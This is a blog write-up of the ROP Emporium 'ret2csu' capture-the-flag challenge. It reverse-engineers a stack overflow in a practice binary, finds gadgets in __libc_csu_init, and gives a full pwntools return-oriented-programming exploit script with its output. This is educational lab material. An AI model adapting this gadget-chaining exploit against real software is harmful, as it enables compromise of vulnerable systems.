<!doctype html><html lang=en>
<head>
<title>ROP Emporium :: Ret2csu :: Anvbis</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="A writeup for the binary exploitation challenge 'ret2csu' from the ROP Emporium challenge set.">
<meta name=keywords content>
<meta name=robots content="noodp">
<link rel=canonical href=https://anvbis.github.io/posts/rop-emporium-ret2csu/>
<link rel=stylesheet href=https://anvbis.github.io/assets/style.css>
<link rel=stylesheet href=https://anvbis.github.io/assets/red.css>
<link rel=apple-touch-icon href=https://anvbis.github.io/img/apple-touch-icon-192x192.png>
<link rel="shortcut icon" href=https://anvbis.github.io/img/favicon/red.png>
<meta name=twitter:card content="summary">
<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="ROP Emporium :: Ret2csu">
<meta property="og:description" content="A writeup for the binary exploitation challenge 'ret2csu' from the ROP Emporium challenge set.">
<meta property="og:url" content="https://anvbis.github.io/posts/rop-emporium-ret2csu/">
<meta property="og:site_name" content="Anvbis">
<meta property="og:image" content="https://anvbis.github.io/img/favicon/red.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:published_time" content="2021-08-12 00:00:00 +0000 UTC">
</head>
<body class=red>
<div class="container center headings--one-size">
<header class=header>
<div class=header__inner>
<div class=header__logo>
<a href=/>
<div class=logo>
Anvbis
</div>
</a>
</div>
<div class=menu-trigger>menu</div>
</div>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
</nav>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>
<a href=https://anvbis.github.io/posts/rop-emporium-ret2csu/>ROP Emporium :: Ret2csu</a></h1>
<div class=post-meta>
<span class=post-date>
2021-08-12
</span>
</div>
<span class=post-tags>
#<a href=https://anvbis.github.io/tags/rop/>rop</a>&nbsp;
#<a href=https://anvbis.github.io/tags/ctf/>ctf</a>&nbsp;
#<a href=https://anvbis.github.io/tags/linux/>linux</a>&nbsp;
</span>
<div class=post-content><div>
<h2 id=reverse-engineering>Reverse Engineering<a href=#reverse-engineering class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Let&rsquo;s run the <code>file</code> command to get a brief overview of the binary. Note that it is a 64-bit linux executable.</p>
<pre><code>$ file ./ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
</code></pre><p>We can also run <code>checksec</code> against the target. This reveals a little more information, we can see that there is no stack canary, so there&rsquo;s no need to bypass that protection. We can also see that the NX bit is enabled, so we can&rsquo;t execute shellcode.</p>
<pre><code>$ checksec ./ret2csu
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
</code></pre><p>Running the executable shows us that it at some point takes user input. This is likely where we&rsquo;ll be able to find some vulnerability.</p>
<pre><code>$ ./ret2csu                   
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

&gt; hello
Thank you!
</code></pre><p>After a tiny bit of reverse engineering, we see this <code>pwnme</code> function called by <code>main</code>. We can see that it allocates 0x20 bytes of memory for a buffer <code>buf</code>, before reading in 0x200 bytes from stdin and storing it in the buffer - here is our overflow.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>pwnme</span>(<span style=color:#66d9ef>void</span>)
{
    <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>buf;
    
    setvbuf(<span style=color:#f92672>*</span>_reloc.stdout, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
    puts(<span style=color:#ae81ff>0xc88</span>);
    puts(<span style=color:#ae81ff>0xca0</span>);
    memset(<span style=color:#f92672>&amp;</span>buf, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x20</span>);
    puts(<span style=color:#ae81ff>0xca8</span>);
    printf(<span style=color:#ae81ff>0xd12</span>);
    read(<span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>buf, <span style=color:#ae81ff>0x200</span>);
    puts(<span style=color:#ae81ff>0xd15</span>);
    <span style=color:#66d9ef>return</span>;
}
</code></pre></div><p>Further investigation reveals that there is a function called <code>ret2win</code>. Another function <code>usefulFunction</code> appears to call <code>ret2win</code> with the parameters <code>ret2win(0x3, 0x2, 0x1)</code>. We&rsquo;ll want to investigate this function further.</p>
<pre><code>0x00400510    1 6            sym.imp.ret2win
</code></pre><pre><code>0x000000000040061b &lt;+4&gt;:     mov    edx,0x3
0x0000000000400620 &lt;+9&gt;:     mov    esi,0x2
0x0000000000400625 &lt;+14&gt;:    mov    edi,0x1
0x000000000040062a &lt;+19&gt;:    call   0x400510 &lt;ret2win@plt&gt;
</code></pre><p>Reversing the <code>ret2win</code> function reveals that it will immediately call <code>exit</code> if the correct parameters are not provided. If the correct parameters are provided, however, the binary will decrypt and print the flag stored in <code>encrypted_flag.dat</code>.</p>
<p>The correct parameters are as follows:</p>
<ul>
<li><code>$rdi = 0xdeadbeefdeadbeef</code>.</li>
<li><code>$rsi = 0xcafebabecafebabe</code>.</li>
<li><code>$rdx = 0xd00df00dd00df00d</code>.</li>
</ul>
<p>So we have to find some way to set all of these registers to their correct values before calling the <code>ret2win</code> function in order to get the flag.</p>
<pre><code>      0x000009ef      48b8efbeadde.  movabs rax, 0xdeadbeefdeadbeef
      0x000009f9      483945e8       cmp qword [var_18h], rax
  ┌─&lt; 0x000009fd      0f85d7000000   jne 0xada
  │   0x00000a03      48b8bebafeca.  movabs rax, 0xcafebabecafebabe
  │   0x00000a0d      483945e0       cmp qword [var_20h], rax
 ┌──&lt; 0x00000a11      0f85c3000000   jne 0xada
 ││   0x00000a17      48b80df00dd0.  movabs rax, 0xd00df00dd00df00d
 ││   0x00000a21      483945d8       cmp qword [var_28h], rax
┌───&lt; 0x00000a25      0f85af000000   jne 0xada
│││   0x00000a2b      488d35ee0200.  lea rsi, [0x00000d20]
│││   0x00000a32      488d3de90200.  lea rdi, str.encrypted_flag.dat
│││   0x00000a39      e8f2fdffff     call sym.imp.fopen

...

│││
└└└─&gt; 0x00000ada      488d3d930200.  lea rdi, str.Incorrect_parameters
      0x00000ae1      e8bafcffff     call sym.imp.puts           ; int puts(const char *s)
      0x00000ae6      bf01000000     mov edi, 1                  ; int status
      0x00000aeb      e850fdffff     call sym.imp.exit           ; void exit(int status)
</code></pre><h2 id=information-gathering>Information Gathering<a href=#information-gathering class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>First, let&rsquo;s find the offset of the return address from where our input buffer is stored in the <code>pwnme</code> function.</p>
<p>We&rsquo;ll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>

<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./ret2csu&#39;</span>)
gdb<span style=color:#f92672>.</span>attach(r)

r<span style=color:#f92672>.</span>clean()
r<span style=color:#f92672>.</span>writeline(cyclic(<span style=color:#ae81ff>200</span>))

r<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>We can continue within GDB, and print the value at the top of the stack to get the value stored in the return pointer.</p>
<pre><code>pwndbg&gt; x/gx $rsp
0x7ffe9d7c4538: 0x6161616161616166
</code></pre><p>Using pwntools' <code>cyclic_find</code> function we can get the offset from the start of our input buffer to the return address stored on the stack.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py>In [<span style=color:#ae81ff>2</span>]: cyclic_find(<span style=color:#ae81ff>0x6161616161616166</span>, n<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>)
Out[<span style=color:#ae81ff>2</span>]: <span style=color:#ae81ff>40</span>
</code></pre></div><p>Next let&rsquo;s figure out how we can store a value in the <code>$rdx</code> register. We&rsquo;re able to store values in the <code>$rdi</code> and <code>$rsi</code> registers quite easily (they have <code>pop; ret</code> gadgets we can easily use).</p>
<p>After digging around the <code>__libc_csu_init</code> function, we find two interesting looking gadgets, see below (I&rsquo;ve added some comments for clarity).</p>
<p>Note that we can use the first gadget to set the values of <code>$rsi</code> and <code>$rdx</code>.</p>
<pre><code>0x00400680      4c89fa         mov rdx, r15
0x00400683      4c89f6         mov rsi, r14
0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
0x00400691      4839dd         cmp rbp, rbx
0x00400694      75ea           jne 0x400680
</code></pre><pre><code>0x0040069a      5b             pop rbx ; set to 0
0x0040069b      5d             pop rbp ; set to 1 to bypass check after call
0x0040069c      415c           pop r12 ; set to pointer to useless function
0x0040069e      415d           pop r13
0x004006a0      415e           pop r14 ; set to 0xcafebabecafebabe to store in $rsi
0x004006a2      415f           pop r15 ; set to 0xd00df00dd00df00d to store in $rdx
0x004006a4      c3             ret
</code></pre><p>It&rsquo;ll be a little complex, but we should be able to use these to get the values we want into our target registers.</p>
<p>We can use the second gadget to set up for the first gadget (so we can move the correct values into our target registers).</p>
<p>Note the <code>call qword [r12 + rbx*8]</code> instruction. As it dereferences a pointer to a function, we can&rsquo;t use this to redirect execution.</p>
<pre><code>0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
</code></pre><p>Instead we&rsquo;ll have to find a pointer to some function that doesn&rsquo;t change anything, as to not ruin the values stored in our target registers. We&rsquo;ll just pass by this call and head to the <code>ret</code> instruction below.</p>
<p>Let&rsquo;s take a look at the functions stored in the binary, and see if we can find any pointers to them.</p>
<pre><code>pwndbg&gt; info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  ret2win@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
</code></pre><p>Using <code>objdump</code> and <code>grep</code> we can look for the first couple bytes of each function, and see if they show up anywhere in the disassembly.</p>
<p>The address that immediately jumps out to me is <code>0x4003af</code>, which contains the bytes for the <code>_fini</code> function, a suitably inert function.</p>
<pre><code>$ objdump -D ret2csu | grep '06 40' -B 1
  4003ad:       00 0e                   add    %cl,(%rsi)
  4003af:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
--
  40052e:       54                      push   %rsp
  40052f:       49 c7 c0 b0 06 40 00    mov    $0x4006b0,%r8
  400536:       48 c7 c1 40 06 40 00    mov    $0x400640,%rcx
  40053d:       48 c7 c7 07 06 40 00    mov    $0x400607,%rdi
--
  600e45:       00 00                   add    %al,(%rax)
  600e47:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
</code></pre><p>We can look this up in GDB to be sure (adding 1 to align the address correctly).</p>
<pre><code>pwndbg&gt; x/x (0x4003af + 1)
0x4003b0:       0x00000000004006b4
</code></pre><p>Now we can use the <code>ropper</code> tool to find a gadget to set the value of <code>$rdi</code>. Surprise, surprise, we immediately find one.</p>
<pre><code>$ ropper --file ./ret2csu --search '% rdi' 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi

[INFO] File: ./ret2csu
0x00000000004006a3: pop rdi; ret;
</code></pre><h2 id=exploit-development>Exploit Development<a href=#exploit-development class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>We have all the information we need, so let&rsquo;s start building our exploit. Here&rsquo;s an outline of what we want to achieve:</p>
<ul>
<li>Overwrite the return address in the <code>pwnme</code> function.</li>
<li>Store the values <code>0xcafebabecafebabe</code> and <code>0xd00df00dd00df00d</code> in the <code>$rsi</code> and <code>$rdx</code> registers.</li>
<li>Store the value <code>0xdeadbeefdeadbeef</code> in the <code>$rdi</code> register.</li>
<li>Call the <code>ret2win</code> function with the above values.</li>
</ul>
<p>Note: we have to be pretty careful when using the gadgets we found in the csu function, in order to pass the check after the call, we have to set the values <code>$rbp = 1</code> and <code>$rbx = 0</code>.</p>
<p>We also have to pad out the stack so that the <code>pop</code> instructions after the call don&rsquo;t destroy our rop chain.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>

<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>


<span style=color:#e6db74>&#39;&#39;&#39;
</span><span style=color:#e6db74>pop rbx     ; 0
</span><span style=color:#e6db74>pop rbp     ; 1
</span><span style=color:#e6db74>pop r12     ; 0x4003af+1
</span><span style=color:#e6db74>pop r13
</span><span style=color:#e6db74>pop r14     ; 0xcafebabecafebabe
</span><span style=color:#e6db74>pop r15     ; 0xd00df00dd00df00d
</span><span style=color:#e6db74>ret         ; ret2csu_rdx
</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
ret2csu_set <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00400680</span>

<span style=color:#e6db74>&#39;&#39;&#39;
</span><span style=color:#e6db74>mov rdx, r15
</span><span style=color:#e6db74>mov rsi, r14
</span><span style=color:#e6db74>mov edi, r13d
</span><span style=color:#e6db74>call qword [r12 + rbx*8]
</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
ret2csu_rdx <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0040069a</span>

<span style=color:#e6db74>&#39;&#39;&#39;
</span><span style=color:#e6db74>pop rdi     ; 0xdeadbeefdeadbeef
</span><span style=color:#e6db74>ret         ; ret2win
</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
pop_rdi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x004006a3</span>

<span style=color:#e6db74>&#39;&#39;&#39;
</span><span style=color:#e6db74>jmp qword [reloc.ret2win]
</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
ret2win <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00400510</span> 


elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./ret2csu&#39;</span>)
rop <span style=color:#f92672>=</span> ROP(elf)

<span style=color:#75715e># ret2csu_set</span>
rop<span style=color:#f92672>.</span>raw(ret2csu_rdx)
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)                  <span style=color:#75715e># pop rbx</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>1</span>)                  <span style=color:#75715e># pop rbp</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0x4003af</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)         <span style=color:#75715e># pop r12</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)                  <span style=color:#75715e># pop r13</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0xcafebabecafebabe</span>) <span style=color:#75715e># pop r14</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0xd00df00dd00df00d</span>) <span style=color:#75715e># pop r15</span>

<span style=color:#75715e># ret2csu_rdx</span>
rop<span style=color:#f92672>.</span>raw(ret2csu_set)

<span style=color:#75715e># pop_rdi</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)                  <span style=color:#75715e># stack alignment</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)                  <span style=color:#75715e># pop rbx</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)                  <span style=color:#75715e># pop rbp</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)                  <span style=color:#75715e># pop r12</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)                  <span style=color:#75715e># pop r13</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)                  <span style=color:#75715e># pop r14</span>
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)                  <span style=color:#75715e># pop r15</span>
rop<span style=color:#f92672>.</span>raw(pop_rdi)
rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>) <span style=color:#75715e># pop rdi</span>

<span style=color:#75715e># ret2win</span>
rop<span style=color:#f92672>.</span>raw(ret2win)

r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./ret2csu&#39;</span>)

r<span style=color:#f92672>.</span>clean()
r<span style=color:#f92672>.</span>writeline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>40</span> <span style=color:#f92672>+</span> rop<span style=color:#f92672>.</span>chain())

r<span style=color:#f92672>.</span>readline()
log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>&#39;Flag: &#39;</span> <span style=color:#f92672>+</span> r<span style=color:#f92672>.</span>readline()<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
</code></pre></div><p>And finally, here&rsquo;s our exploit in action.</p>
<pre><code>./exploit.py 
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './ret2csu'
[+] Starting local process './ret2csu': pid 1110
[+] Flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2csu' stopped with exit code 0 (pid 1110)
</code></pre>
</div></div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user">
<span>Anvbis</span>
</div>
</div>
</footer>
<script src=https://anvbis.github.io/assets/main.js></script>
<script src=https://anvbis.github.io/assets/prism.js></script>
</div>
</body>
</html>